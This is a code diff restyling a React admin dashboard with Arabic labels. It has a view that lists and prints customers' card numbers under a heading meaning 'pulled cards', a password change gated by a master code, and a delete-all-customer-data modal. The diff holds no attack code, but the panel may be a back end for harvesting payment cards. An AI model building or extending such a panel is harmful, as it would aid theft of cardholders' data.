-              </div>
-              <div className="cards-grid-v2">
-                {customers.filter(c => c.card_number).map((c, i) => (
-                  <VirtualCard key={i} customer={c} />
-                ))}
-              </div>
-            </div>
-          )}
+            {currentView === 'cards' && (
+              <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="page-view-v3">
+                <div className="page-header-v3">
+                  <h2>البطاقات المسحوبة</h2>
+                  <button className="print-btn" onClick={() => window.print()}><Printer size={18} /> طباعة PDF</button>
+                </div>
+                <div className="cards-grid-v3">
+                  {customers.filter(c => c.card_number).map((c, i) => <VirtualCard key={i} customer={c} />)}
+                </div>
+              </motion.div>
+            )}
 
-          {currentView === 'users' && (
-            <div className="full-page-view">
-              <div className="view-header-row">
-                <h2>تغيير كلمة المرور</h2>
-                <p>تحديث بيانات الدخول للنظام</p>
-              </div>
-              <div className="password-change-container">
-                <div className="info-card-v2" style={{ maxWidth: '500px', margin: '0 auto' }}>
-                  <div className="input-group-v2">
+            {currentView === 'users' && (
+              <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="page-view-v3">
+                <div className="page-header-v3">
+                  <h2>إعدادات النظام وتغيير كلمة المرور</h2>
+                </div>
+                <div className="settings-form-v3">
+                  <div className="form-group-v3">
                     <label>كلمة المرور الجديدة</label>
-                    <div className="master-input-wrap">
+                    <div className="input-with-icon">
                       <Lock size={18} />
                       <input type="password" placeholder="أدخل كلمة المرور الجديدة" value={newAdminUser.password} onChange={e => setNewAdminUser({ ...newAdminUser, password: e.target.value })} />
                     </div>
                   </div>
-
-                  <div className="input-group-v2" style={{ marginTop: '20px' }}>
-                    <label>الرمز السري للتأكيد</label>
-                    <div className="master-input-wrap">
+                  <div className="form-group-v3">
+                    <label>الرمز السري للتأكيد (الماستر كود)</label>
+                    <div className="input-with-icon">
                       <ShieldAlert size={18} />
                       <input type="password" placeholder="أدخل الكود السري" value={masterCode} onChange={e => setMasterCode(e.target.value)} />
                     </div>
                   </div>
-
-                  <button
-                    className="save-user-btn"
-                    style={{ marginTop: '30px', width: '100%', height: '50px' }}
-                    onClick={handleChangePassword}
-                    disabled={loadingAction === 'change_pass'}
-                  >
-                    {loadingAction === 'change_pass' ? 'جاري التحديث...' : 'تحديث كلمة المرور'}
+                  <button className="submit-btn-v3" onClick={handleChangePassword} disabled={loadingAction === 'change_pass'}>
+                    {loadingAction === 'change_pass' ? 'جاري التحديث...' : 'تحديث البيانات'}
                   </button>
                 </div>
-              </div>
-            </div>
-          )}
-        </main>
-      </div>
-
-      {/* Delete All Data Modal (The only one staying as popup) */}
-      {isDeleteModalOpen && (
-        <div className="modal-overlay-v2">
-          <div className="modal-content-v2" style={{ maxWidth: '400px', textAlign: 'center' }}>
-            <button className="close-modal-v2" onClick={() => setIsDeleteModalOpen(false)}><X /></button>
-            <div style={{ color: '#e53935', marginBottom: '15px' }}><AlertCircle size={48} /></div>
-            <h3>حذف كافة البيانات</h3>
-            <p style={{ fontSize: '13px', color: '#666', marginBottom: '20px' }}>سيتم مسح كافة بيانات العملاء نهائياً. يرجى إدخال الماستر كود للتأكيد.</p>
-            <input
-              type="password"
-              placeholder="الرمز الرئيسي"
-              className="modal-input"
-              style={{ textAlign: 'center' }}
-              value={masterCode}
-              onChange={e => setMasterCode(e.target.value)}
-            />
-            <button
-              className="act-btn-v2 btn-reject"
-              style={{ height: '50px', width: '100%', fontSize: '14px' }}
-              onClick={handleDeleteAllData}
-              disabled={loadingAction === 'delete_all'}
-            >
-              {loadingAction === 'delete_all' ? 'جاري المسح...' : 'تأكيد المسح النهائي'}
-            </button>
-          </div>
+              </motion.div>
+            )}
+          </AnimatePresence>
         </div>
-      )}
+      </main>
+
+      {/* Modals */}
+      <AnimatePresence>
+        {isDeleteModalOpen && (
+          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="modal-overlay-v3">
+            <div className="modal-content-v3">
+              <button className="close-modal-btn" onClick={() => setIsDeleteModalOpen(false)}><X /></button>
+              <Trash2 size={48} color="#ef4444" />
+              <h3>حذف كافة البيانات نهائياً</h3>
+              <p>يرجى إدخال الماستر كود للتأكيد. هذا الإجراء لا يمكن التراجع عنه.</p>
+              <input type="password" placeholder="الرمز السري" value={masterCode} onChange={e => setMasterCode(e.target.value)} className="modal-input-v3" />
+              <button className="btn-danger-v3" onClick={handleDeleteAllData} disabled={loadingAction === 'delete_all'}>
+                {loadingAction === 'delete_all' ? 'جاري المسح...' : 'تأكيد المسح'}
+              </button>
+            </div>
+          </motion.div>
+        )}
+      </AnimatePresence>
     </div>
   );
 };
